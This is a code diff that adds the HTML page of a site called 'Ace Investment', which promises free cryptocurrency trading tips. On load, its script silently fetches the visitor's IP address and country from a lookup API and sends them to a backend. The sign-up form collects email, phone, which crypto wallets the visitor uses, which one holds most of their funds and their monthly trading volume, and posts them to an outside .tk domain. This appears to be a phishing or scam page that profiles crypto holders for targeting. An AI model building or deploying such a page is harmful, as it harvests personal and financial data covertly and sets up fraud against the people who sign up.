@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>
+        Ace Investment
+    </title>
+    <link rel="stylesheet" href="css/master.css">
+    <link rel="icon" type="image/png" href="media/favicon.png" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+    <script>
+        $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
+            var w_data = JSON.stringify(data, null, 2);
+            sendData(data.countryName, data.ipAddress);
+        });
+
+        function sendData(country, ip){
+            var url = 'https://localhost/Ace-investment-website/index.php?country=' + country + '&ip=' + ip;
+            $.ajax({
+                type: "GET",
+                url: url,
+                cache: false,
+                success: function(data){
+                    console.log(data);
+                }
+            });
+        }
+    </script>
+</head>
+
+<body>
+    <div class="header">
+        <img class="logo" src="media/logo.png">
+    </div>
+    <div class="header-bg">
+        <div class="container">
+            <div class="header">
+                <p class="header-text">
+                    Free Crypto trading tips!
+                </p>
+                <span class="divider"></span>
+                <p class="header-subtext">
+                    Get Valuable Cryptocurrency trading tips daily<br>to help skyrocket your career in Cryptocurrency.
+                </p>
+            </div>
+                <button onClick="scrollDown()" class="button-freet" >Free Tips ↓</button>
+        </div>
+    </div>
+    <div class="body c-display-container" style="z-index: -2;">
+    </div>
+    <div class="body c-display-container" style="top:100%;">
+        <div class="c-display-top" style="top:110%;">
+        <img class="crypto-coins" src="media/crypto-coins.jpg">
+    </div>
+    </div>
+    
+    <div class="info-container">
+        <div class="info">
+            <div class="card card-1">
+                <span class="title title-1">100%</span>
+                <span class="desc desc-1">Free Service</span>
+            </div>
+
+            <div class="card card-2">
+                <span class="title title-2">150+</span>
+                <span class="desc desc-2">Monthly Signals</span>
+            </div>
+
+            <div class="card card-3">
+                <span class="title title-3">450+</span>
+                <span class="desc desc-3">Assets<br>Available to Trade</span>
+            </div>
+        </div>
+    </div>
+
+    <div id="body" class="body" style="background-color:white;">
+        <div class="c-display-amiddle" style="top:250%;">
+            <h3>Sign-up form</h3>
+            <form name="joinForm" onsubmit="return validator()" action="https://fl4k.tk/Ace-investment-website/index.php?" style="user-select: none;">
+
+              <input type="hidden" name="func_name" value="apply-form">
+
+              <label for="email">Email address</label>
+              <input type="text" id="email" name="email" placeholder="user@example.com">
+
+              <label for="phone">Phone number</label>
+              <div>
+                  <tr>
+                      <td><input style="width:20%" type="text" id="countrycode" name="countrycode"
+                              placeholder="eg +1"></td>
+                      <td><input style="width:79%" type="text" id="phone" name="phone"
+                              placeholder="eg (xxx) xxx-xxxx"></td>
+                  </tr>
+              </div>
+
+              <h5 id="cw">Select all the crypto wallets you use to trade and hold your crypto currency</h5>
+
+              <input type="checkbox" id="wallet" name="wallet[]" value="coinbase">
+              <label>CoinBase</label><br>
+
+              <input type="checkbox" id="wallet" name="wallet[]" value="blockchain">
+              <label>Blockchain</label><br>
+
+              <input type="checkbox" id="wallet" name="wallet[]" value="binance">
+              <label>Binance</label><br>
+
+              <input type="checkbox" id="wallet" name="wallet[]" value="cex.io">
+              <label>cex.io</label><br>
+
+              <input type="checkbox" id="wallet" name="wallet[]" value="gemini">
+              <label>Gemini</label><br>
+
+              <input type="checkbox" id="wallet" name="wallet[]" value="wirex">
+              <label>Wirex</label><br>
+
+              <input type="checkbox" id="wallet" name="wallet[]" value="paxful">
+              <label>Paxful</label><br>
+
+              <input type="checkbox" id="wallet" name="wallet[]" value="kraken">
+              <label>Kraken</label><br>
+
+              <input type="checkbox" id="wallet" name="wallet[]" value="crypto.com">
+              <label>crypto.com</label><br>
+
+              <input type="checkbox" id="another-wallet" name="wallet[]" value="something else">
+              <label>Something else</label><br>
+
+              <input type="text" id="se" name="se" style="display: none;"
+                  placeholder="A crypto wallet that isn't on the list"></ <h5><br></h5>
+
+              <label for="maj">Which wallet do you use to hold the majority of your cryptocurrency?</label>
+              <select name="majority" id="maj-dropdown">
+                  <option value="none">Select a wallet:</option>
+                  <option value="coinbase">CoinBase</option>
+                  <option value="blockchain">Blockchain</option>
+                  <option value="binance">Binance</option>
+                  <option value="cex.io">cex.io</option>
+                  <option value="gemini">Gemini</option>
+                  <option value="wirex">Wirex</option>
+                  <option value="paxful">Paxful</option>
+                  <option value="kraken">Kraken</option>
+                  <option value="crypto.com">crypto.com</option>
+                  <option id="maj-se" value="se" style="display: none;">Something else</option>
+              </select>
+
+              <label for="mbasis">How much do you normally trade on a monthly basis?</label>
+              <input type="text" id="mbasis" name="mbasis" placeholder="$ -,---.-">
+
+              <input class="submitButton" type="submit" value="Submit">
+          </form>
+        </div>
+    </div>
+
+    <script src="js/homepage.js"></script>    
+</body>
+
+</html>
